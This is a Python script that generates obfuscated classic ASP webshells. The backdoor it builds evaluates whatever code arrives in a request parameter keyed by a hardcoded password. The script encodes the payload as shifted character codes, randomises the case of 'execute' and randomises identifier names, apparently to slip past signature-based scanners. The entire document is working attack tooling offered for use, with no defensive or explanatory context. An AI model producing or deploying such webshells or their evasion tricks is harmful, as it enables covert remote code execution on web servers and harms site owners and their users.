import random
func='execute'
passwd='yzddmr6'
str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
str2='`~-=!@#$%^&*_/+?<>{}|:[]'
payload='eval request("{}")'.format(passwd)
def random_list():
    str_random=list(str1)
    random.shuffle(str_random)
    return ''.join(str_random)


def random_case():
    temp='0123456'
    a=random.sample(list(temp),3)
    random_case=list(func)
    for i in a:
        random_case[int(i)]=random_case[int(i)].upper()
    random_case=''.join(random_case)
    return random_case


def random_name(len):
    return ''.join(random.sample(str1,len))   
    

def random_payload():
    gen_payload=''
    random_sign=random.choice(str2)
    random_num=random.randint(10,99)
    for i in payload:
        gen_payload+=random_sign+str(ord(i)+random_num)
    return gen_payload,random_sign,random_num
    
def shell_main():
    text='''
<%
<!--
Function {0}({3}):
	{3} = Split({3},"{5}")
	For x=1 To Ubound({3})
		{0}={0}&Chr({3}(x)-{4})
	Next
End Function
{2}({0}("{1}"))
-->
%>
    '''
    gen_payload,random_sign,random_num=random_payload()
    res=text.format(random_name(4),gen_payload,random_case(),random_name(4),random_num,random_sign)
    print(res)
shell_main()
